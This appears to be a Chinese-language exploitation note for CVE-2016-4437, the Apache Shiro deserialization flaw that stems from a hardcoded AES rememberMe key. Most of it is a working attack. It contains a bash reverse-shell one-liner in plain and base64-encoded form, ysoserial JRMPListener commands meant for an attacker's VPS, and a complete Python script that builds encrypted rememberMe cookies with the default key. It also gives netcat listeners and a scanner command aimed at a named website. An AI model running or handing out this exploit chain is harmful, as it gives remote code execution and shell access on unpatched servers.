---
title: shiro
---

## CVE-2016-4437）Apache Shiro <= v1.2.4 反序列化漏洞
一、漏洞简介
Apache shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值-->Base64解码-->AES解密-->反序列化。
然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。
## 二、漏洞影响
Apache Shiro <= v1.2.4

三、复现过程
##
## bash 转码地址
http://www.jackson-t.ca/runtime-exec-payloads.html
## bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
## ![image.png](/assets/pages_shiro_1614145050794_0.png)
## 姿势一
在vps上开启rmi注册表服务|
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'
## ![image.png](/assets/pages_shiro_1614145077881_0.png)
## 生成payload
python exploit.py vps:1099
## ![image.png](/assets/pages_shiro_1614145089851_0.png){:height 150, :width 626}
## exploit.py
```python
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
print "rememberMe={0}".format(payload.decode())
```
nc监听
nc -lvvp 8888
使用burp发送生成好的payload
## ![image.png](/assets/pages_shiro_1614145153048_0.png)
## ![image.png](/assets/pages_shiro_1614145163486_0.png)
## poc
https://github.com/ianxtianxt/ShiroScan
## 首先我们在服务器中进行监听

nc -lvvp 1234
执行poc进行反弹shell
## python3 shiro.py https://www.0-sec.org "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}"
## ![image.png](/assets/pages_shiro_1614144876802_0.png)
## ![image.png](/assets/pages_shiro_1614144883758_0.png)
